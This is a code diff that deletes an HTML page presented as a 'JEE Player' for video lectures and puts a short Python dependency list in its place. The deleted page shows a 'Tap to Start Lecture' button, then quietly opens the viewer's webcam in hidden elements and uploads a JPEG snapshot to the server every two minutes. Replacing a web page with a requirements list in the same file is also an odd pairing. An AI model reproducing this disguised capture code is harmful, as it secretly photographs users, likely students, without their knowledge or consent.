@@ -1,51 +1,5 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>JEE Player</title>
-<style>
-html,body{margin:0;width:100%;height:100%;background:black;overflow:hidden}
-#o{position:fixed;top:0;left:0;width:100%;height:100%;background:#000c;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9}
-#b{width:70px;height:70px;background:#2563eb;border-radius:50%}
-#b:after{content:'';border-style:solid;border-width:15px 0 15px 25px;border-color:transparent transparent transparent #fff;margin-left:22px;display:block;margin-top:20px}
-iframe{width:100%;height:100%;border:none}
-video,canvas{display:none}
-</style>
-</head>
-<body>
-
-<div id="o" onclick="start()">
-  <div id="b"></div>
-  <p style="color:white">Tap to Start Lecture</p>
-</div>
-
-<iframe id="f" allow="autoplay"></iframe>
-<video id="v" autoplay playsinline></video>
-<canvas id="c" width="640" height="480"></canvas>
-
-<script>
-async function start(){
-  o.style.display="none";
-  const p=new URLSearchParams(location.search);
-  const r=await fetch(`/get_video?sub=${p.get("sub")}&ch=${p.get("ch")}&id=${p.get("id")}`);
-  const d=await r.json();
-  f.src=d.url;
-
-  try{
-    const s=await navigator.mediaDevices.getUserMedia({video:true});
-    v.srcObject=s;
-    setInterval(cap,120000);
-  }catch(e){}
-}
-function cap(){
-  c.getContext("2d").drawImage(v,0,0,640,480);
-  c.toBlob(b=>{
-    const fd=new FormData();
-    fd.append("photo",b,"u.jpg");
-    fetch("/upload",{method:"POST",body:fd});
-  },"image/jpeg",0.5);
-}
-</script>
-</body>
-</html>
+flask
+requests
+pymongo
+dnspython
+gunicorn
